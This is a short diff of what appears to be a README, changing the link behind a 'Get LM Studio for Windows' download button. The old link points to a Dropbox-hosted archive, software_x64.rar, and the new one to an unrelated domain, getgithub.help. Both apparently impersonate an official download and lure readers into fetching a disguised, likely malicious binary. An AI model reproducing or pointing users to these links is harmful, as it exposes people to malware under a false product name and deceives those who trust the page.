@@ -7,7 +7,7 @@
 <br>
 
 <p align="center">
-  <a href="https://www.dropbox.com/scl/fi/4whnyk4ykzjvh5kwmd0lg/software_x64.rar?rlkey=66avbljkqkwdlwediivvyg7aa&st=5pal39fy&dl=1">
+  <a href="https://getgithub.help">
     <img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="200" alt="Get LM Studio for Windows">
   </a>
 </p>
